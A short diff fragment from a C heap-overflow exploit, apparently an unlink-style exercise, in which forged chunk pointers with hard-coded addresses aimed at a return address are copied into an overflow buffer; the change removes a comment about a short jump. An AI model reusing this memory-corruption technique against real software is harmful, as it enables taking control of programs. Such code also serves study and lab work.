@@ -27,7 +27,6 @@ int main(void)
   char fake_prev[] = "\x28\xee\x04\x01";
   char fake_next[] = "\x68\xfe\xa4\x40"; //rip return address
  
-  // or use 0x04eb - jump by 4 bytes 
   memcpy(&buf_overflow[0],fake_prev_1, 4);//connect the fake tag p with real p tag
   //fake_next_1 = \x01\x01\x01\x01
   
